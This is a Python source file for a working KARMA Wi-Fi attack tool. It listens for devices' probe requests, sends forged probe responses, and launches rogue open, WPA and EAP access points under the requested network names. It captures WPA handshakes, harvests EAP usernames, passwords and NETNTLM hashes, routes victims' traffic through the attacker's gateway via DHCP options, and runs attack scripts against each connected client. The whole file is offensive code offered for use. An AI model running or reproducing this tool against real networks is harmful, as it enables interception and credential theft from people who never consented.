#!/usr/bin/python3
from scapy.all import *
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from mac_vendor_lookup import MacLookup # pip3 install mac-vendor-lookup
from netaddr import IPNetwork, IPAddress
import os
import random
import subprocess
from signal import SIGTERM
from time import sleep, time
from datetime import datetime
from threading import Thread
from colorama import Fore
from getkey import getkey
import argparse


TIMEOUT = 20
TIMEOUT_CLIENT_RECONNECT = 5
CHANNEL_HOPPING_TIMEOUT = 2
CLIENT_MONITOR_TIMEOUT = 2
network_scenarios = []
client_scenarios = []
handshake_scenarios = []
oui = MacLookup()
conf.verb = 0
is_exit = False

def on_probe(essid, sta, freq, signal, vendor):
	for cwd,directories,files in os.walk("on_probe"):
		for file in files:
			script = os.path.join(cwd, file)
			if os.access(script, os.X_OK):
				subprocess.Popen(f'{script} "{essid}" {sta} {freq} {signal} "{vendor}"', shell=True, preexec_fn=os.setsid)

def on_network(essid, iface):
	for cwd,directories,files in os.walk("on_network"):
		for file in files:
			script = os.path.join(cwd, file)
			if os.access(script, os.X_OK):
				DEBUG(f'{script} {iface} "{essid}"')
				network_scenarios.append( subprocess.Popen(f'{script} {iface} "{essid}"', shell=True, preexec_fn=os.setsid) )

def on_client(ip, mac, attacker_ip):
	for cwd,directories,files in os.walk("on_client"):
		for file in files:
			script = os.path.join(cwd, file)
			if os.access(script, os.X_OK):
				DEBUG(f"{script} {ip} {mac} {attacker_ip}")
				client_scenarios.append( subprocess.Popen(f"{script} {ip} {mac} {attacker_ip}", shell=True, preexec_fn=os.setsid) )

def on_handshake(pcap, essid, bssid):
	for cwd,directories,files in os.walk("on_handshake"):
		for file in files:
			script = os.path.join(cwd, file)
			if os.access(script, os.X_OK):
				DEBUG(f'{script} "{pcap}" "{essid}" {bssid}')
				handshake_scenarios.append( subprocess.Popen(f'{script} "{pcap}" "{essid}" {bssid}', shell=True, preexec_fn=os.setsid) )

passwords = {}
def update_handshakes_info():
	global passwords, known_essids
	passwords_new = {}
	for cwd,directories,files in os.walk("handshakes"):
		for file in files:
			if file.endswith(".txt"):
				essid = file[:-4]
				if not passwords.get(essid):
					password = open(os.path.join(cwd, file)).read()
					if password:
						passwords[essid] = password
						passwords_new[essid] = password
						if essid in known_essids:
							known_essids.remove(essid)
	return passwords_new

def stop_scenarios():
	for scenario in network_scenarios + client_scenarios:# + handshake_scenarios:
		#scenario.kill()
		os.killpg(os.getpgid(scenario.pid), SIGTERM)
		DEBUG(f"stop scenario {scenario.args}")
	network_scenarios.clear()
	client_scenarios.clear()
	handshake_scenarios.clear()

def stop_APs():
	print("stopping APs...")
	if hostapd_opn:
		hostapd_opn.dhcpd.stop()
		hostapd_opn.shutdown()
	if hostapd_wpa:
		if hostapd_wpa.dhcpd:
			hostapd_wpa.dhcpd.stop()
		hostapd_wpa.shutdown()
	if hostapd_wpe:
		hostapd_wpe.shutdown()
	stop_scenarios()

def control():
	global probes, is_exit
	while True:
		cmd = getkey()
		if cmd == "h":
			print("h -	show help")
			print("p -	print Probes")
			print("s -	force stop APs")
			print("q -	exit")
		elif cmd == "p":
			for essid in probes:
				print("{essid} {clients}".format(essid=essid, clients=",".join(probes[essid])))
		elif cmd == "s":
			stop_APs()
		elif cmd == "q":
			stop_APs()
			print("exiting...")
			is_exit = True
			break

def DEBUG(msg, end='\n'):
	if args.d:
		print(Fore.LIGHTBLACK_EX + "[.] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO(msg, end='\n'):
	print(Fore.LIGHTBLUE_EX + "[*] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO2(msg, end='\n'):
	print(Fore.BLUE + "[*] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def INFO3(msg, end='\n'):
	print(Fore.BLUE + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def NOTICE(msg, end='\n'):
	print(Fore.LIGHTCYAN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def WARN(msg, end='\n'):
	print(Fore.LIGHTGREEN_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def CRIT(msg, end='\n'):
	print(Fore.LIGHTRED_EX + "[+] [{time}] {msg}".format(time=get_time(), msg=msg) + Fore.RESET, end=end)

def ERROR(msg, end='\n'):
	print(Fore.RESET + "[!] [{time}] {msg}".format(time=get_time(), msg=msg), end=end)

class Hostapd:
	config = ''
	file = ''
	name = ''
	binary = ''
	def __init__(self, iface, essid, password):
		self.iface = iface
		self.essid = essid
		self.password = password or 'impossible_to_guess'
		self.is_up = False
		self.is_shutdown = False
		self.clients = {}
		with open(self.file, "w") as f:
			f.write(self.config.format(iface=self.iface, essid=self.essid, password=self.password))
#		DEBUG("ifconfig {iface} up".format(iface=self.iface))
#		os.system("ifconfig {iface} up".format(iface=self.iface))
		self.hostapd = subprocess.Popen([self.binary, self.file], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		self.__status_thr = Thread(target=self.status)
		self.__client_monitor_thr = Thread(target=self.client_monitor)
		self.__status_thr.start()
		self.__client_monitor_thr.start()
		self.dhcpd = None
		self.network = None

	def wait(self, max_waiting_time):
		begin = time()
		while not self.is_up:
			sleep(0.1)
			if time() - begin > max_waiting_time:
				break
	
	def shutdown(self):
		self.is_shutdown = True
		self.hostapd.terminate()
		sleep(1)
		self.hostapd.kill()
		self.hostapd.wait()
#		os.system("ifconfig {iface} down".format(iface=self.iface))
#		DEBUG("ifconfig {iface} down".format(iface=self.iface))

	def status(self):
		while True:
			line = self.hostapd.stdout.readline()
			if not line:
				sleep(1)
				continue
			DEBUG(line)
			line = line.decode("utf-8")
			if line.find("AP-ENABLED") != -1:
				self.is_up = True
			elif line.find("AP-DISABLED") != -1:
				self.is_up = False
			elif line.find("AP-STA-CONNECTED") != -1:
				client = line.split()[2]
				vendor = lookup(client)
				NOTICE("[{hostapd}] client {client} ({vendor}) connected".format(hostapd=self.name, client=client, vendor=vendor))
			elif line.find("AP-STA-DISCONNECTED") != -1:
				client = line.split()[2]
				NOTICE("[{hostapd}] client {client} disconnected".format(hostapd=self.name, client=client))
			if self.is_shutdown:
				break

	def client_monitor(self):
		while True:
			if not self.is_up:
				sleep(1)
				continue
			self.clients = {}
			for line in subprocess.check_output("iw dev {iface} station dump".format(iface=self.iface).split()).split(b"\n"):
				#DEBUG(line)
				line = line.decode("utf-8")
				if line.find('Station') != -1:
					client = line.split()[1]
				elif line.find('signal:') != -1:
					signal = line.split()[1]
					self.clients[client] = signal
			if self.clients:
				for client in self.clients:
					NOTICE("client {client}: {rx} dBm".format(client=client, rx=self.clients[client]))
			sleep(CLIENT_MONITOR_TIMEOUT)
			if self.is_shutdown:
				break

	def change_network_settings(self, network):
		self.network = IPNetwork(network)
		DEBUG("ifconfig {iface} {network}".format(iface=self.iface, network=network))
		os.system("ifconfig {iface} {network}".format(iface=self.iface, network=network))


class Hostapd_OPN(Hostapd):
	binary = 'hostapd'
	name = "OPN"
	file = "/tmp/ap_opn.conf"
	config = '''interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''

class Hostapd_WPA(Hostapd):
	binary = 'hostapd'
	name = "WPA"
	file = "/tmp/ap_wpa.conf"
	config = '''interface={iface}
driver=nl80211
ssid={essid}
hw_mode=g
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase={password}
'''

class Hostapd_WPE(Hostapd):
	binary = 'hostapd-eaphammer'
	name = "EAP"
	file = "/tmp/ap_wpe.conf"
	config = '''interface={iface}
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/certs/dh
ssid={essid}
channel=1
hw_mode=g
eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2
ctrl_interface=/var/run/hostapd-wpe
ctrl_interface_group=0
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=-1
fragm_threshold=-1
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0
wmm_enabled=1
wmm_ac_bk_cwmin=4
wmm_ac_bk_cwmax=10
wmm_ac_bk_aifs=7
wmm_ac_bk_txop_limit=0
wmm_ac_bk_acm=0
wmm_ac_be_aifs=3
wmm_ac_be_cwmin=4
wmm_ac_be_cwmax=10
wmm_ac_be_txop_limit=0
wmm_ac_be_acm=0
wmm_ac_vi_aifs=2
wmm_ac_vi_cwmin=3
wmm_ac_vi_cwmax=4
wmm_ac_vi_txop_limit=94
wmm_ac_vi_acm=0
wmm_ac_vo_aifs=2
wmm_ac_vo_cwmin=2
wmm_ac_vo_cwmax=3
wmm_ac_vo_txop_limit=47
wmm_ac_vo_acm=0
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
'''
	def client_monitor(self):
		pass

	def status(self):
		while True:
			line = self.hostapd.stdout.readline()
			if not line:
				sleep(1)
				continue
			DEBUG(line)
			line = line.decode("utf-8")
			if line.find("AP-ENABLED") != -1:
				self.is_up = True
			elif line.find("AP-DISABLED") != -1:
				self.is_up = False
			elif line.find("STA") != -1 and line.find('associated') != -1:
				client = line.split()[2]
				vendor = lookup(client)
				NOTICE("[{hostapd}] client {client} ({vendor}) connected".format(hostapd=self.name, client=client, vendor=vendor))
			elif line.find("deauthenticated") != -1:
				client = line.split()[2]
				NOTICE("[{hostapd}] client {client} disconnected".format(hostapd=self.name, client=client))
			elif line.find("username:") != -1 or line.find("password:") != -1 or line.find("NETNTLM:") != -1:
				CRIT("[{hostapd}] {line}".format(hostapd=self.name, line=line.split('\n')[0]))
			if self.is_shutdown:
				break

class DHCPD:
	file = "/tmp/dhcp_{iface}.conf"
	config = '''domain=fake.net
interface={iface}
dhcp-range={ip_start},{ip_end},24h
dhcp-option=1,{mask}
dhcp-option=3,{ip_gw}
dhcp-option=6,8.8.8.8,8.8.4.4
dhcp-option=121,0.0.0.0/1,{ip_gw},128.0.0.0/1,{ip_gw}
dhcp-option=249,0.0.0.0/1,{ip_gw},128.0.0.0/1,{ip_gw}
'''
	def __init__(self, iface, network):
		self.iface = iface
		net = IPNetwork(network)
		self.ip_start = str(net[10])
		self.ip_end = str(net[20])
		self.mask = str(net.netmask)
		self.ip_gw = str(net[1])
		self.is_up = False
		self.is_shutdown = False
		self.clients = {}
		self.file = self.file.format(iface=iface)
		with open(self.file, "w") as f:
			f.write(self.config.format(iface=self.iface, ip_start=self.ip_start, ip_end=self.ip_end, mask=self.mask, ip_gw=self.ip_gw))
		self.dhcpd = subprocess.Popen(["dnsmasq", "--conf-file="+self.file, "-d", "-p0"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	def stop(self):
		self.is_shutdown = True
		self.dhcpd.terminate()
		sleep(1)
		#self.dhcpd.kill()
		self.dhcpd.wait()

def get_time():
	return datetime.now().strftime("%H:%M:%S")

def get_mac():
	return Ether().src

def get_password(essid):
	try:
		return open(os.path.join("handshakes","%s.txt"%essid)).read()
	except:
		return ""

def lookup(mac):
	try:
		return oui.lookup(mac)
	except:
		return 'unknown'


def try_to_start_hostapd(Hostapd, iface, essid, password, max_attempts=5):
	attempt = 0
	while attempt <= max_attempts:
		attempt += 1
		DEBUG("Try to start \"{essid}\" attempt {n}".format(essid=essid, n=attempt))
		hostapd = Hostapd(iface, essid, password)
		hostapd.wait(5)
		if hostapd.is_up:
			break
		else:
			DEBUG("Error starting {hostapd}. Starting again".format(hostapd=Hostapd.__name__))
			hostapd.shutdown()
			sleep(1)
			continue
	return hostapd

hostapd_opn = None
hostapd_opn_is_start = False
hostapd_wpa = None
hostapd_wpa_is_start = False
hostapd_wpe = None
hostapd_wpe_is_start = False
victim_trafic = PacketList()
def start_AP_OPN(iface, essid):
	global hostapd_opn, hostapd_opn_is_start, victim_trafic, handshakes, known_targets
	
	if hostapd_opn_is_start:
		return
	hostapd_opn_is_start = True

	hostapd_opn = try_to_start_hostapd(Hostapd_OPN, iface, essid, password=False, max_attempts=5)
	if hostapd_opn.is_up:
		hostapd_opn.change_network_settings("11.0.0.1/24")
		hostapd_opn.dhcpd = DHCPD(iface, "11.0.0.1/24")
		INFO("run OPN network \"{essid}\" ({num})".format(num=pcap_no, essid=essid))
		on_network(essid, iface)
		begin = time()
		while time() - begin < TIMEOUT: # waiting first client
			try:
				victim_trafic = sniff(iface=iface, prn=parse_client_trafic_OPN, timeout=1)
			except:
				break
			if handshakes: # if it was WPA network
				break
		while hostapd_opn.clients and not handshakes:
			try:
				victim_trafic += sniff(iface=iface, prn=parse_client_trafic_OPN, timeout=TIMEOUT_CLIENT_RECONNECT) # waiting during client won't disconnected
			except:
				break
		hostapd_opn.dhcpd.stop()
		hostapd_opn.shutdown()
		stop_scenarios()
		#if victim_trafic:
		#	save(victim_trafic, network_name=essid)
		INFO("stop OPN network \"{essid}\"".format(essid=essid))
	else:
		hostapd_opn.shutdown()
		ERROR("network OPN \"{essid}\" wasn't started".format(essid=essid))

	hostapd_opn = None
	victim_trafic = PacketList()
	known_targets.clear()
	hostapd_opn_is_start = False

handshakes = []
def start_AP_WPA(iface, essid):
	global hostapd_wpa, hostapd_wpa_is_start, handshakes, victim_trafic, known_targets

	if hostapd_wpa_is_start:
		return
	hostapd_wpa_is_start = True

	password = get_password(essid)
	hostapd_wpa = try_to_start_hostapd(Hostapd_WPA, iface, essid, args.psk or password, max_attempts=5)
	if hostapd_wpa.is_up:
		if args.psk or password:
			hostapd_wpa.change_network_settings("12.0.0.1/24")
			hostapd_wpa.dhcpd = DHCPD(iface, "12.0.0.1/24")
		INFO("run WPA network \"{essid}\" \"{password}\" ({num})".format(num=pcap_no, essid=essid, password=args.psk or password))
		on_network(essid, iface)
		m1 = False
		m2 = False
		begin = time()
		while time() - begin < TIMEOUT: 					# waiting client
			try:
				if not password:
					for p in sniff(iface=args.mon, filter="ether proto 0x888e", timeout=4):
						if EAPOL in p and p[Dot11].addr3 == wpa_mac:
							handshakes.append(p)
							if p[Dot11].addr2 == wpa_mac:
								m1 = True
							elif p[Dot11].addr1 == wpa_mac:
								m2 = True
					if m1 and m2:
						WARN("handshake: %d EAPOL packets (M1/M2)" % len(handshakes))
						break
				else:
					sniff(iface=iface, prn=parse_client_trafic_WPA, timeout=1)
					if hostapd_opn and hostapd_opn.clients:
						break
			except Exception as e:
				print(str(e))
				break
		if hostapd_wpa.dhcpd:
			hostapd_wpa.dhcpd.stop()
		hostapd_wpa.shutdown()
		if handshakes and not password:
			handshakes.append(get_beacon(essid))
			pcap = save(handshakes, network_name=os.path.join("handshakes", essid))
			if pcap:
				open(os.path.join("handshakes","%s.txt"%essid),"w").close()
				on_handshake(pcap, essid, get_mac())
		stop_scenarios()
		INFO("stop WPA network \"{essid}\"".format(essid=essid))
	else:
		hostapd_wpa.shutdown()
		ERROR("network WPA \"{essid}\" wasn't started".format(essid=essid))

	hostapd_wpa = None
	handshakes = []
	known_targets.clear()
	hostapd_wpa_is_start = False

def start_AP_EAP(iface, essid):
	global hostapd_wpe, hostapd_wpe_is_start, known_targets
	
	if hostapd_wpe_is_start:
		return
	hostapd_wpe_is_start = True

	hostapd_wpe = try_to_start_hostapd(Hostapd_WPE, iface, essid, password=False, max_attempts=5)
	if hostapd_wpe.is_up:
		INFO("run EAP network \"{essid}\" ({num})".format(num=pcap_no, essid=essid))
		begin = time()
		while time() - begin < TIMEOUT: # waiting first client
			sleep(1)
			if handshakes: # if it was WPA network
				break
		hostapd_wpe.shutdown()
		INFO("stop EAP network \"{essid}\"".format(essid=essid))
	else:
		hostapd_wpe.shutdown()
		ERROR("network EAP \"{essid}\" wasn't started".format(essid=essid))

	hostapd_wpe = None
	known_targets.clear()
	hostapd_wpe_is_start = False

def save(trafic, network_name):
	target_file = '%s.pcap' % network_name
	if not os.path.isfile(target_file):
		wrpcap(target_file, trafic)
		return '%s.pcap'%network_name

probes = {}
def statistics(sta, essid):
	global probes
	if not essid in probes:
		probes[essid] = set([sta])
		return True
	else:
		probes[essid].add(sta)
		return False

known_essids = set([])
pcap_no = 1
def parse_raw_80211(p):
	global known_essids, hostapd_opn, hostapd_wpa, hostapd_wpe, pcap_no, is_exit
	if is_exit:
		raise Exception
	if Dot11ProbeReq in p:
		if p[Dot11].subtype == 4:
			sta = p[Dot11].addr2
			try:
				essid = str(p[Dot11Elt].info, "utf-8")
			except:
				essid = ""
			vendor = lookup(sta)
			signal = "%s" % p[RadioTap].dBm_AntSignal if hasattr(p[RadioTap], "dBm_AntSignal") else "-"
			freq = "%d" % p[RadioTap].ChannelFrequency if hasattr(p[RadioTap], "ChannelFrequency") else "-"

			on_probe(essid, sta, freq, signal, vendor)
			if essid:
				if statistics(sta, essid):
					INFO3("{sta} ({vendor}) [{count}] {signal} dBM ({freq} MHz): {essid}".format(
						sta=sta, vendor=vendor, 
						count=len(probes[essid]),
						signal=signal, freq=freq, essid=essid)
					)
				else:
					INFO2("{sta} ({vendor}) [{count}] {signal} dBM ({freq} MHz): {essid}".format(
						sta=sta, vendor=vendor, 
						count=len(probes[essid]),
						signal=signal, freq=freq, essid=essid)
					)
				passwords_new = update_handshakes_info()
				if passwords_new:
					for essid in passwords_new:
						WARN("{essid} {password}".format(essid=essid, password=passwords_new[essid]))
				if essid and not essid in known_essids and not hostapd_opn and not hostapd_wpa and not hostapd_wpe:
					pcap_no += 1
					#os.system("killall -KILL hostapd 2> /dev/null")
					if args.opn:
						Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
						known_essids.add(essid)
						probe_response(args.mon, sta, essid)
					#sleep(1)
					if args.wpa:
						Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
						known_essids.add(essid)
						probe_response(args.mon, sta, essid, is_wpa=True)
					#sleep(1)
					if args.eap:
						Thread(target=start_AP_EAP, args=(args.eap,essid)).start()
						known_essids.add(essid)
						probe_response(args.mon, sta, essid, is_wpa=True)
	'''else:
		essid = "test"
		if not essid in known_essids and not hostapd_opn and not hostapd_wpa:
			pcap_no += 1
			if args.opn:
				Thread(target=start_AP_OPN, args=(args.opn,essid)).start()
			if args.wpa:
				Thread(target=start_AP_WPA, args=(args.wpa,essid)).start()
			known_essids.add(essid)'''
				
known_targets = set()
def parse_client_trafic_OPN(p):
	global known_targets, hostapd_opn
	if IP in p:
		src = p[IP].src
		dst = p[IP].dst
	elif ARP in p:
		src = p[ARP].psrc
		dst = p[ARP].pdst
	else:
		return

	if src in ("0.0.0.0", "127.0.0.1", hostapd_opn.dhcpd.ip_gw if hostapd_opn.dhcpd else ""):
		return
	if src in known_targets or dst in known_targets:
		return
	if p[Ether].src == opn_mac:
		return
	client_mac = p[Ether].src
	client_ip = src
	ip_gw = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
	WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
	known_targets.add(client_ip)
	if not client_ip in hostapd_opn.network:
		hostapd_opn.change_network_settings("{ip}/24".format(ip=ip_gw))
	on_client(client_ip, client_mac, ip_gw)

def parse_client_trafic_WPA(p):
	global known_targets, hostapd_wpa
	if IP in p:
		src = p[IP].src
		dst = p[IP].dst
	elif ARP in p:
		src = p[ARP].psrc
		dst = p[ARP].pdst
	else:
		return

	client_mac = p[Ether].src
	client_ip = src
	if src in ("0.0.0.0", "127.0.0.1", hostapd_wpa.dhcpd.ip_gw if hostapd_wpa.dhcpd else ""):
		return
	if client_mac in known_targets:
		return
	if p[Ether].src == wpa_mac:
		return
	ip_gw = str( IPNetwork("{ip}/24".format(ip=client_ip))[1] )
	WARN("client {mac} {ip}".format(mac=client_mac, ip=client_ip))
	known_targets.add(client_mac)
	if not client_ip in hostapd_wpa.network:
		hostapd_wpa.change_network_settings("{ip}/24".format(ip=ip_gw))
	on_client(client_ip, client_mac, ip_gw)

def get_beacon(essid):
	radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(1),Antenna=1)
	dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',addr2=wpa_mac, addr3=wpa_mac)
	beacon = Dot11Beacon(cap='ESS+privacy')
	essid = Dot11Elt(ID='SSID',info=essid, len=len(essid))
	return radio/dot11/beacon/essid

def probe_response(iface, target, essid, is_wpa=False):
	RATE_1B = b"\x82"
	RATE_2B = b"\x84"
	RATE_5_5B = b"\x8b"
	RATE_11B = b"\x96"
	if is_wpa:
		cap = 0x3104
		mac = wpa_mac
	else:
		cap = 0x2104
		mac = opn_mac
	#radio = RadioTap(len=18, present=0x482e,Rate=2,Channel=2412,ChannelFlags=0x00a0,dBm_AntSignal=chr(77),Antenna=1)
	radio = RadioTap()
	probe = Dot11(subtype=5, addr1=target, addr2=mac, addr3=mac, SC=0x3060)/\
	 Dot11ProbeResp(timestamp=123123123, beacon_interval=0x0064, cap=cap)/\
	 Dot11Elt(ID='SSID', info=essid)/\
	 Dot11Elt(ID='Rates', info=RATE_1B+RATE_2B+RATE_5_5B+RATE_11B)/\
	 Dot11Elt(ID='DSset', info=chr(1))
	sendp(radio/probe, iface=iface, loop=0)

def sniffer(iface):
	try:
		sniff(iface=iface, prn=parse_raw_80211, store=0)
	except:
		return


parser = argparse.ArgumentParser(description='KARMA - attack of unauthenticated Wi-Fi clients')
parser.add_argument("-mon", type=str, metavar='iface', default='', help="interface for monitoring 802.11 Probes")
parser.add_argument("-opn", type=str, metavar='iface', default='', help="interface for starting OPN networks")
parser.add_argument("-wpa", type=str, metavar='iface', default='', help="interface for starting WPA networks")
parser.add_argument("-eap", type=str, metavar='iface', default='', help="interface for starting EAP networks")
parser.add_argument("-T", type=int, metavar='seconds', default='20', help="wifi network working time")
parser.add_argument("--essid", type=str, metavar='name', default='', help="force start wifi network with ESSID")
parser.add_argument("--psk", type=str, metavar='password', default='', help="use PSK key for WPA networks")
parser.add_argument("-d", action="store_true", default=False, help="show more info")
args = parser.parse_args()

origin = conf.iface
conf.iface = args.opn
opn_mac = Ether().src
conf.iface = args.wpa
wpa_mac = Ether().src
conf.iface = origin
TIMEOUT = args.T

update_handshakes_info()

if args.opn and args.essid:
	start_AP_OPN(args.opn, args.essid)
elif args.wpa and args.essid:
	start_AP_WPA(args.wpa, args.essid)
elif args.eap and args.essid:
	start_AP_EAP(args.eap, args.essid)
elif args.mon:
	Thread(target=control).start()
	Thread(target=sniffer, args=(args.mon,)).start()
